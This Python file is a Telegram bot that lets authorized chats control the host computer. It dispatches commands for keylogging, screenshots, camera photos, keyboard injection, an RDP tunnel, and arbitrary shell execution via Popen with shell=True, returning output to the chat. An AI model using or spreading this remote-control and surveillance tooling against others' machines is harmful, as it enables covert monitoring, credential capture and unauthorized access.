from telepot.loop import MessageLoop
from dotenv import load_dotenv
import os
from subprocess import run, Popen, PIPE
import telepot
from urllib import request as open_web
import time
import features

load_dotenv()
api_key = os.getenv("API_KEY")
telegram_bot = telepot.Bot(api_key)
feature = features.features(telegram_bot)
Commands_slash = ['/ai', '/non_ai']


def replymessage(first_name, last_name, command, chat_id):
    """
    Processes and executes commands received from a Telegram chat.

    Args:
        first_name (str): The first name of the user sending the command.
        last_name (str): The last name of the user sending the command.
        command (str): The command text received from the user.
        chat_id (int): The unique identifier for the chat where the command was received.

    Returns:
        None
    """
    name = f'{first_name} {last_name}'
    print(name)
    print('Received:', command, 'chat_id', chat_id)
    authorized = False
    print(feature.random)
    if feature.pending == 0 or chat_id != feature.aut_chat_id:
        for i in feature.auth_list['authorized']:
            if i['chat_id'] == chat_id:
                authorized = True
                break
        if authorized:
            list_command = command.split()
            cmd = list_command[0].lower()

            command_handlers = {
                "send": feature.send,
                "video": feature.video,
                "screen": feature.screen,
                "types": feature.keyboard_type,
                "speak": feature.speak,
                "screenshot": feature.take_screenshot,
                "stop": feature.kill_task,
                "photo": feature.take_photo,
                "keylog": feature.key_logger,
                "chat": feature.run_language_model,
                "list": feature.list_users,
                "kick": feature.kick_user,
                "rdp": feature.start_stop_rdp_tunnel,
            }
            if feature.chat_mode.get(chat_id) == 'ai':
                command_handlers['chat'](
                    chat_id, command, list_command, first_name, last_name)
            elif cmd in command_handlers:
                command_handlers[cmd](
                    chat_id, command, list_command, first_name, last_name)
            elif chat_id == feature.chat_id_file and cmd == feature.random_f:
                feature.save_file_in_fin(chat_id)
            else:
                process = Popen(command, shell=True,
                                stdout=PIPE, stderr=PIPE, text=True)
                stdout, stderr = process.communicate()
                if process.returncode != 0:
                    telegram_bot.sendMessage(chat_id, "INVALID Command")
                else:
                    telegram_bot.sendMessage(chat_id, stdout)
                    telegram_bot.sendMessage(chat_id, 'ok')
        else:
            feature.send_first_auth_code(chat_id, name)
    else:
        feature.receive_auth_code(name, chat_id, command)


key_list = ["text", "voice", "photo", "video", "document"]

connected = False
while (connected == False):
    try:
        x = open_web.urlopen('https://google.com/')
        connected = True
    except Exception:
        connected = False
        time.sleep(1)
print(feature.auth_list)


def set_chat_mode(msg, mode):
    """
    Checks if the user is authorized and sets the chat mode.

    Args:
        msg (dict): The message object received from the Telegram bot.
        mode (str): The chat mode to be set ('ai' or 'non_ai').

    Returns:
        None
    """
    chat_id = msg['chat']['id']
    authorized = any(user['chat_id'] ==
                     chat_id for user in feature.auth_list['authorized'])

    if authorized:
        feature.setChatMode(chat_id, mode)
        mode_text = "AI" if mode else "non-AI"
        telegram_bot.sendMessage(chat_id, f"Chat mode set to {mode_text}.")
    else:
        replymessage(msg['chat']['first_name'], msg['chat']
                     ['last_name'], msg[key_list[0]], chat_id)


def action(msg):
    """
    Handles incoming messages from the Telegram bot and determines the type of message.

    Args:
        msg (dict): The message object received from the Telegram bot.

    Returns:
        None
    """
    print(feature.auth_list)

    chat_id = msg['chat']['id']
    first_name = msg['chat']['first_name']
    last_name = msg['chat']['last_name']
    for i in key_list:
        try:
            command = msg[i]
            key = i
        except KeyError:
            continue
    if key == "text":
        if command in Commands_slash:
            if command == Commands_slash[0]:
                if(feature.chat_bot_enabled==False):
                    telegram_bot.sendMessage(
                        chat_id, "Chat bot is disabled. Please enable it to use this feature.")
                    return
                set_chat_mode(msg, True)
            elif command == Commands_slash[1]:
                set_chat_mode(msg, False)
        else:
            replymessage(first_name, last_name, command, chat_id)
    if key in key_list[1:]:
        speach_recon, command = feature.download_file(msg, key)
        if speach_recon is True:
            replymessage(first_name, last_name, command, chat_id)


feature.test_message()

print(telegram_bot.getMe())  # for internal testing
MessageLoop(telegram_bot, action).run_as_thread()

while 1:
    time.sleep(1)
